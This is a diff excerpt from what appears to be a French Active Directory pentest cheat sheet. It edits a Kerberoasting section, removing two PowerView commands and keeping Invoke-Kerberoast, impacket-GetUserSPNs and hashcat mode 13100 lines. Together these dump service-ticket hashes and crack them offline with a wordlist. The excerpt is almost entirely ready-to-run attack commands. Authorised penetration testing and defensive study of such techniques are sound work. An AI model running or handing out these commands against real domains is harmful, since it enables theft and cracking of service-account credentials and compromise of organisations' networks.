@@ -95,8 +95,6 @@ https://github.com/Mazars-Tech/AD_Miner
 Kerberoasting
 ---
 ```
-Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher -Format Hashcat
-Invoke-Kerberoast | fl
 Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
 impacket-GetUserSPNs 'mondomaine.fr/mon.user:monpassword' -outputfile kerberoastable.txt -dc-ip X.X.X.X
 hashcat -m 13100 --force -a 0 /home/kali/Downloads/hashes.txt /home/kali/Downloads/rockyou.txt
